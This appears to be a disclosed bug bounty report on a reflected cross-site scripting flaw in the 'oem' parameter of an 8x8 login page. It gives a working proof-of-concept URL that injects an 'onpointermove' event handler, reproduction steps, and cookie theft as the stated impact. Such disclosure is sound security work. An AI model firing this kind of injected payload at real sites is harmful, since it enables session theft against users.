# xss(r) vcc-na11.8x8.com

## Report Details
- **Report ID**: 1392733
- **URL**: https://hackerone.com/reports/1392733
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-11-06T05:47:37.180Z
- **Disclosed**: 2023-07-10T16:48:19.363Z

## Reporter
- **Username**: ssharmaz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: 8x8-bounty

## Vulnerability Information
xss(r)  on vcc-na11.8x8.com oem parameter
"oem" parameter in endpoint vcc-na11.8x8.com is not sanitized and is pen to Reflected Cross Site Scripting Attacks
https://vcc-na11.8x8.com/CM/login.php?oem=%22onpointermove%3Dprompt%281%29+class%3Dss11+

**Description:** [add more details about this vulnerability]
xss(r)  on vcc-na11.8x8.com oem parameter
"oem" parameter in endpoint vcc-na11.8x8.com is not sanitized and is pen to Reflected Cross Site Scripting Attacks
Specifically stealing non secure cookies

## Steps To Reproduce:

(Add details for how we can reproduce the issue)

  1. Click on link
https://vcc-na11.8x8.com/CM/login.php?oem=%22onpointermove%3Dprompt%281%29+class%3Dss11+
  2. Move mouse over body
  3. xss is trigerred

## Supporting Material/References:

The payload is reflected multiple places in response body
<a href=" http://www.google.com/chrome">	
	<img src="/./OEM/"onpointermove=prompt(1)class=ss11/common/images/browsers/chrome.png"class="browser-logo" alt="{{#txt_unsupported_browser_chrome#}}" />
	<h2>{{#txt_unsupported_browser_chrome#}}</h2>

From <https://vcc-na11.8x8.com/CM/login.php?oem=%22onpointermove%3Dprompt%281%29+class%3Dss11+>

## Impact

Cookie stealing

## Attachments
No attachments
